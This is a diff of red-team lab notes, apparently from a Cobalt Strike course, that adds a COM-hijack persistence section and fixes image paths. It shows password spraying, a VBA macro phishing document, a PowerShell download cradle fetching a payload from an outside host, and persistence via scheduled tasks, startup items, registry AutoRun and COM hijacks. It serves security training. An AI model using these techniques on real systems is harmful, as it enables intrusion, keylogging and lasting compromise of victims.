@@ -140,9 +140,9 @@ Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\val
 This is likely going to get caught by Defender, so make sure you grant an exception for it in _**Windows Security if needed.**_
 {% endhint %}
 
-<figure><img src="../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>
 
 In my case, I had to create an exception for it.
 
@@ -213,7 +213,7 @@ The following phishing attacks are going to be using Outlook here.
 Using our enumerated/valid usernames and successful password spray, we can authenticate against the Outlook server (since we're in the network/domain already) and take a look for anything juicy.
 {% endhint %}
 
-<figure><img src="../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>
 
 ### Authenticating To Outlook
 
@@ -223,7 +223,7 @@ Using our enumerated/valid usernames and successful password spray, we can authe
 https://mail.cyberbotic.io/owa/
 ```
 
-<figure><img src="../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>
 
 **Upon continuing and avoiding the non http(s) screen, we can authenticate using our credentials:**
 
@@ -255,7 +255,7 @@ We can leverage VBA to create macros in documents for malicious purposes.
 4. Change the "Macros in" field from "All active templates and documents" to "Document1 (document)
 5. Give it a name (use name `AutoOpen`) and click **create**
 
-<figure><img src="../.gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>
 
 ### Opening Notepad w/ Macro
 
@@ -282,11 +282,11 @@ Use the **PowerShell** Beacon payload in Cobalt Strike.
 1. Open Cobalt Strike
 2. Go to **Attacks -> Scripted Web Delivery (S)** and generate a 64-bit PowerShell payload for the HTTP Listener
 
-<figure><img src="../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>
 
 3. You will obtain a **Success** prompt from CS.&#x20;
 
-<figure><img src="../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>
 
 Be sure to copy/paste that line into VBA and add another set of double quotation marks around the `IEX` command. It should look like this:
 
@@ -294,7 +294,7 @@ Be sure to copy/paste that line into VBA and add another set of double quotation
 Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""
 ```
 
-<figure><img src="../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>
 
 **Putting it all together:**
 
@@ -314,19 +314,19 @@ End Sub
 2. It will ask you to save, don't worry about that, click cancel and the **Document Inspector** will open
 3. Uncheck the **Document Properties and Personal Information**
 
-<figure><img src="../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>
 
 4. Next, go to **File -> Save As** and save to `C:\Payloads` (save as type dropdown and change the format from `.docx` to `Word 97-2003 Document (*.doc)`)
 
-<figure><img src="../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>
 
 5. **Inside CS, Site Management -> Host File and Configure accordingly:**
 
-<figure><img src="../.gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>
 
 6. Service has been started
 
-<figure><img src="../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>
 
 ```
 http://nickelviper.com:80/ProductReport.doc
@@ -623,13 +623,13 @@ Microsoft Corporation, One Microsoft Way, Redmond, WA 98052 </td>
 
 Once in the OWA text editor, you can highlight the `ProductReport.doc` and `Open` and once highlighted, press `ctrl+k` and that will allow you to paste the link for the Beacon Macro Payload, `http://nickelviper.com:80/ProductReport.doc`.&#x20;
 
-<figure><img src="../.gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>
 
 If the victim falls for it, they can open the document and it will get executed.
 
 ### Victim Will see...
 
-<figure><img src="../.gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="danger" %}
 Since this file is marked with the Mark of the Web (MOTW), the user will need to select **Enable Editing** for the malicious macro to be executed.
@@ -639,11 +639,11 @@ This is the only downfall to this approach as it takes significant user-interact
 
 ### The Victim Fell for it
 
-<figure><img src="../.gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>
 
 ### Analyzing Cobalt Strike Sessions Thus far...
 
-<figure><img src="../.gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>
 
 We can see that we have `bfarmer`, that is on a different workstation other than `Attacker`, that is running via Malicious PowerShell Macro Beacon.&#x20;
 
@@ -658,11 +658,11 @@ This is a technique where an attacker can send a benign document to a victim and
 
 * This is now our malicious remote template
 
-<figure><img src="../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>
 
 3. Configure Cobalt Strike to host this file at `http://nickelviper.com/phish-template.dot`
 
-<figure><img src="../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>
 
 4. Now create a new document from the blank template located in `C:\Users\Attacker\Documents\Custom Office Templates`, adding any content you want, and save it to `C:\Payloads` as a new `.docx`
 5. We can now use [John Woodman](https://twitter.com/JohnWoodman15)'s [python tool](https://github.com/JohnWoodman/remoteinjector) that can automate this process so that we don't have to modify the XML manually.
@@ -676,9 +676,9 @@ URL Injected and saved to /mnt/c/Payloads/document_new.docx
 
 ### Victim Open RTI Email
 
-<figure><img src="../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (351).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (351).png" alt=""><figcaption></figcaption></figure>
 
 We got him!
 
@@ -698,7 +698,7 @@ ps
 **The indentation represents parent/child relationships.**
 {% endhint %}
 
-<figure><img src="../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 Processes in <mark style="color:yellow;">yellow</mark> indicate our **Beacon** **process**.
@@ -744,7 +744,7 @@ beacon> screenshot
 
 To see all the screenshots that have been taken, go to **View > Screenshots**.
 
-<figure><img src="../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>
 
 ### Keyloggers
 
@@ -757,7 +757,7 @@ beacon> keylogger
 
 These keystrokes can be viewed in **View -> Keystrokes**.
 
-<figure><img src="../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>
 
 ### Clipboard
 
@@ -799,7 +799,7 @@ DEV\jking
 DEV\WKSTN-2$
 ```
 
-<figure><img src="../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>
 
 ## Host Persistence
 
@@ -854,7 +854,7 @@ $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a
 SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA
 ```
 
-<figure><img src="../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>
 
 **In Linux:**
 
@@ -867,7 +867,7 @@ ubuntu@DESKTOP-3BSK7NO ~> echo -en $str | iconv -t UTF-16LE | base64 -w 0
 SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA
 ```
 
-<figure><img src="../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>
 
 **Then, execute C# Assembly (`SharPersist.exe`) via the Beacon Terminal:**
 
@@ -899,7 +899,7 @@ beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersis
 Open the Task Scheduler and select _Task Scheduler Library_ in the left-hand menu.  You should see your task appear in the main window.  You may of course wait for one hour, or simply highlight the task and click _Run_ in the right-hand _Actions_ menu.  This should spawn another Beacon.
 {% endhint %}
 
-<figure><img src="../.gitbook/assets/image (359).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (359).png" alt=""><figcaption></figcaption></figure>
 
 ### Startup Folder
 
@@ -917,7 +917,7 @@ beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersis
 [*] INFO: SHA256 Hash of LNK file: B34647F8D8B7CE28C1F0DA3FF444D9B7244C41370B88061472933B2607A169BC
 ```
 
-<figure><img src="../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
 _**Use the Workstation 2 console to check****&#x20;****`C:\Users\bfarmer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`****&#x20;****for the file that was dropped.**_
@@ -929,7 +929,7 @@ _**Use the Workstation 2 console to check****&#x20;****`C:\Users\bfarmer\AppData
 
 This will grant you a shell upon logging back on (or once the user logs back on).
 
-<figure><img src="../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>
 
 ### Registry AutoRun
 
@@ -961,12 +961,157 @@ Where:
 **Note: `HKLM` AutoRun will NOT execute the payload as `SYSTEM`.**&#x20;
 {% endhint %}
 
-<figure><img src="../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
 As before, you can test this by rebooting the VM.
 {% endhint %}
 
-### Hunting for COM Hijacks
+### Hunting for Component Object Models (COM) Hijacks
 
-Coming soon.
+{% hint style="danger" %}
+You can hijack COM objects that are in use, but that comes at the risk of breaking applications that rely on them.
+
+Rather than doing that, a _**safer**_ strategy is to load objects that don't actually exist (these are known as _**abandoned keys**_).
+{% endhint %}
+
+We can rely on _**Process Monitor**_ in order to show us real-time file system, Registry, and process activity, it is also very useful in finding different types of privilege escalation primitives.
+
+#### Filtering (Helpful for combating the amount of events generated)
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+#### What we're looking for...
+
+**Due to the sheer number of events generated, filtering is essential to find the ones of interest. We're looking for:**
+
+* _`RegOpenKey`_ operations.
+* where the Result is `NAME NOT FOUND`.
+* and the Path ends with `InprocServer32`.
+
+:bulb: We are also looking for the number of times that a particular `CLSID` is loaded.
+
+#### Identifying a Potentially Hijackable COM Object
+
+**Using PowerShell, we can see that the entry does exist in `HKLM`, but not in `HKCU`:**
+
+```
+PS C:\Users\Attacker> Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
+
+Hive: HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}
+
+
+Name                           Property
+----                           --------
+InprocServer32                 (default)      : C:\Windows\System32\thumbcache.dll
+                               ThreadingModel : Apartment
+
+PS C:\Users\Attacker> Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
+Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32'
+because it does not exist.
+At line:1 char:1
++ Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...\InprocServer32:String) [Get-Item], ItemNotFoundExcep
+   tion
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand
+
+PS C:\Users\Attacker>
+```
+
+#### Exploitation
+
+To exploit this, we can create the Registry entries in `HKCU` and point them at a Beacon DLL.
+
+**Since this is still on our attacking machine, we'll point it straight at `C:\Payloads\http_x64.dll`:**
+
+```
+PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
+PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
+PS C:\Users\Attacker> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+#### How it works...
+
+Once `DllHost.exe` loads this COM entry, we will get a Beacon.
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+#### Another great place to look for hijackable COM components
+
+We can look in the _**Task Scheduler**_.
+
+Rather than executing binaries on disk, many of the default Windows Tasks will rely on custom triggers to call COM objects. This is because they are executed via the Task Scheduler.
+
+**We can use the following PowerShell script to find compatible tasks:**
+
+```powershell
+$Tasks = Get-ScheduledTask
+
+foreach ($Task in $Tasks)
+{
+  if ($Task.Actions.ClassId -ne $null)
+  {
+    if ($Task.Triggers.Enabled -eq $true)
+    {
+      if ($Task.Principal.GroupId -eq "Users")
+      {
+        Write-Host "Task Name: " $Task.TaskName
+        Write-Host "Task Path: " $Task.TaskPath
+        Write-Host "CLSID: " $Task.Actions.ClassId
+        Write-Host
+      }
+    }
+  }
+}
+```
+
+**Output:**
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+Now, if we look at `MsCtfMonitor`, we can view it in the Task Scheduler.
+
+A quick Google search allowed me to find it swiftly in the Task Scheduler window.
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+We can then see that it is triggered when _**any**_ user logs in.&#x20;
+
+{% hint style="success" %}
+Yes, this acts as an effective reboot-persistence mechanism.&#x20;
+{% endhint %}
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+**We can then look up the current implementation of `{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}` in&#x20;**_**`HKEY_CLASSES_ROOT\CLSID`**_ **(this can be found in the `Task Path` corresponding to `MsCtfMonitor`):**
+
+```
+Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
+
+    Hive: HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}
+
+
+Name                           Property
+----                           --------
+InprocServer32                 (default)      : C:\Windows\system32\MsCtfMonitor.dll
+                               ThreadingModel : Both
+```
+
+**We can see it's another InprocServer32 and we can verify that it's currently implemented in HKLM and not HKCU:**
+
+```
+PS C:\> Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize
+
+Name                                   Property
+----                                   --------
+{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler
+
+
+PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
+Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
+```
+
+_**Simply add a duplicate entry into HKCU pointing to our DLL (as above), and this will be loaded once every time a user logs in.**_
